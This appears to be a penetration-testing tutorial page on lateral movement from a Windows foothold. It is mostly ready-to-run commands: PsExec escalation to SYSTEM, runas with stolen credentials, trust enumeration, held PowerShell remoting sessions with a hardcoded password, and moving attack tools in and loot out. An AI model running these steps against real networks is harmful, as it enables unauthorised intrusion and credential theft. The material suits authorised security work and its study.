# Windows Lateral Movement (from a Windows foothold)

Once you have code execution on one Windows box in a domain, this is how you pivot without dropping to Linux/impacket. Native tools, native protocols, minimal binaries.

Related: [Gaining Shell Access](../initial-access/gaining-shell-access.md) covers the Linux-side equivalents (impacket, evil-winrm).

---

## Elevate to SYSTEM on the Local Box

The single most useful Sysinternals invocation when you're a local admin and want SYSTEM:

```powershell
.\PsExec64.exe -accepteula -s -i powershell.exe
```

| Flag | What it does |
|---|---|
| `-s` | Run as `NT AUTHORITY\SYSTEM` |
| `-i` | Interactive session (attach to a visible desktop / current session) |
| `-accepteula` | Skip the first-run EULA prompt |
| `-h` | Run with the account's elevated token if UAC-elevated |

Verify:

```powershell
whoami                 # NT AUTHORITY\SYSTEM
[Environment]::UserName
```

SYSTEM gives you access to LSASS, protected registry hives, service manager, and every user's profile on the box - the required starting point for `sekurlsa::*`, DPAPI loot, scheduled task abuse, etc.

---

## Run as a Different Domain User (runas)

When you have creds for another domain account and want to run code with those creds without logging out:

```cmd
runas /user:CORP\svc_backup powershell.exe
```

If the current host doesn't trust your credentials for local logon but you still want to authenticate to network resources as that user, use `/netonly`:

```cmd
runas /netonly /user:CORP\svc_backup powershell.exe
```

`/netonly` means:
- The process runs as *you* locally (no local logon happens)
- But every outbound network authentication uses the credentials you supplied

Extremely useful when you have a hash-cracked or phished password for a domain account but you're on a workgroup box, or when you just want a clean PowerShell prompt whose network identity is different from yours.

Verify:

```powershell
klist                                            # see cached Kerberos tickets for the new identity
whoami                                           # local identity (may still be YOU with /netonly)
nltest /parentdomain
Get-ADUser -Identity svc_backup                  # uses network identity
```

---

## Enumerate Trusts (nltest)

Fast, built-in domain trust enumeration - works from any Windows box, no ActiveDirectory module required:

```cmd
nltest /domain_trusts                            # trusted domains, direction, type
nltest /domain_trusts /all_trusts                # include indirect trusts
nltest /trusted_domains                          # local machine's cached trust list
nltest /dclist:corp.local                        # DCs in a given domain
nltest /dsgetdc:corp.local                       # locate a DC and see its capabilities
nltest /sc_query:corp.local                      # secure channel state
```

Interpreting `nltest /domain_trusts`:

```
   0: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain)
   1: PARTNER partner.local (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: within forest )
```

- `Direct Outbound` = you can auth into that domain
- `Direct Inbound` = that domain can auth into yours
- `within forest` = intra-forest trust (transitive, SIDHistory usable)
- No `within forest` = cross-forest trust (check for SID filtering)

Use trust output to feed Rubeus `silver` inter-realm ticket forging or BloodHound `ForeignGroupMembership` queries.

---

## PowerShell Remoting (Enter-PSSession & Held Sessions)

WinRM-based interactive shell to another box. The two-step pattern - **create a session object, then attach to it** - is what lets you break out, work locally, and come back to the same session later.

### One-shot interactive

```powershell
Enter-PSSession -ComputerName srv01.corp.local
# prompt becomes [srv01.corp.local]: PS>
exit
```

### Persistent session held in a variable

The pattern most people miss. Instead of `Enter-PSSession` directly, create a session, save it, then attach and detach as needed:

```powershell
# Create the session (does NOT enter it)
$s = New-PSSession -ComputerName srv01.corp.local

# Attach interactively (can Ctrl-C / exit and come back)
Enter-PSSession -Session $s

# When you exit, the session stays alive
exit

# Come back to it later - state (variables, cwd, loaded modules) is preserved
Enter-PSSession -Session $s

# Or run one-off commands against it without entering
Invoke-Command -Session $s -ScriptBlock { whoami; hostname }

# Close when done
Remove-PSSession $s
```

Why the variable form matters:
- Loading Mimikatz / SafetyKatz / a giant script in-memory once, then reusing it
- Long-running jobs (`Invoke-Command -AsJob`) tied to the session
- Kerberos double-hop scenarios (see below) - the session keeps a delegated ticket

### With alternate credentials

```powershell
$cred = Get-Credential                          # prompts for user + pass
$s = New-PSSession -ComputerName srv01.corp.local -Credential $cred
```

If Get-Credential's GUI is annoying (headless shells), build the credential inline:

```powershell
$pw   = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\svc_backup', $pw)
$s    = New-PSSession -ComputerName srv01.corp.local -Credential $cred
```

### Kerberos double-hop workaround

By default a PSSession will not forward your credentials to a *third* box (the classic double-hop problem). Two fixes:

```powershell
# 1. -Authentication CredSSP (needs CredSSP enabled on both boxes - often not)
Enter-PSSession -ComputerName srv01 -Authentication Credssp -Credential $cred

# 2. Kerberos delegation via PSRemoting - request a delegated TGT
New-PSSession -ComputerName srv01 -Authentication Kerberos -Credential $cred `
              -SessionOption (New-PSSessionOption -IncludePortInSPN)
```

Simpler in practice: get creds for the second hop directly (Rubeus `asktgt` with `/ptt`) and re-run from the new identity.

---

## File Transfer Over an Existing PSSession

Once you have `$s`, you don't need SMB / HTTP / anything else to move files - PSRemoting has this built in:

```powershell
# Push a file from local -> remote
Copy-Item -Path C:\tools\SharpHound.exe -Destination C:\Windows\Temp\ -ToSession $s

# Pull a file from remote -> local
Copy-Item -Path C:\Windows\Temp\loot.zip -Destination C:\loot\ -FromSession $s

# Directories (recursive)
Copy-Item -Path C:\tools\ -Destination C:\Windows\Temp\ -ToSession $s -Recurse
```

Why this is nice:
- Uses the same WinRM channel your shell already runs on - no new firewall ports
- No need to host an HTTP server or share
- No SMB signing / share ACL headaches
- Works cross-domain if the PSSession worked

---

## Putting It Together - A Typical Pivot

```powershell
# 1. Elevate to SYSTEM on the foothold
.\PsExec64.exe -accepteula -s -i powershell.exe

# 2. Dump creds for other users on the box
#    (SafetyKatz / Mimikatz / whatever - out of scope here)

# 3. Enumerate trusts and DCs to know what's reachable
nltest /domain_trusts
nltest /dclist:corp.local

# 4. Take over another account and hold the session
$pw   = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\svc_backup', $pw)
$s    = New-PSSession -ComputerName srv01.corp.local -Credential $cred

# 5. Push tooling into the session and work interactively
Copy-Item -Path C:\tools\Rubeus.exe -Destination C:\Windows\Temp\ -ToSession $s
Enter-PSSession -Session $s
# ... work ...
exit

# 6. Come back to the same session later - state preserved
Enter-PSSession -Session $s
```

---

## Quick Reference

```powershell
# Elevate
.\PsExec64.exe -accepteula -s -i powershell.exe

# Run as another domain user (network identity only)
runas /netonly /user:CORP\svc_backup powershell.exe

# Trusts and DCs
nltest /domain_trusts
nltest /domain_trusts /all_trusts
nltest /dclist:corp.local

# Persistent PSSession pattern
$s = New-PSSession -ComputerName srv01.corp.local -Credential $cred
Enter-PSSession -Session $s
exit
Enter-PSSession -Session $s          # resume
Invoke-Command -Session $s -ScriptBlock { ... }
Remove-PSSession $s

# File transfer over the session
Copy-Item -Path <src> -Destination <dst> -ToSession $s
Copy-Item -Path <src> -Destination <dst> -FromSession $s -Recurse
```

---

## Related

- [Gaining Shell Access](../initial-access/gaining-shell-access.md) - Linux-side equivalents (impacket, evil-winrm)
- [Mimikatz](../post-compromise/mimikatz.md) - credential extraction once elevated
- [SafetyKatz + Loader](../../tools/safetykatz.md) - in-memory alternative when EDR is present
- [Rubeus](../../tools/rubeus.md) - Kerberos operations for the second hop
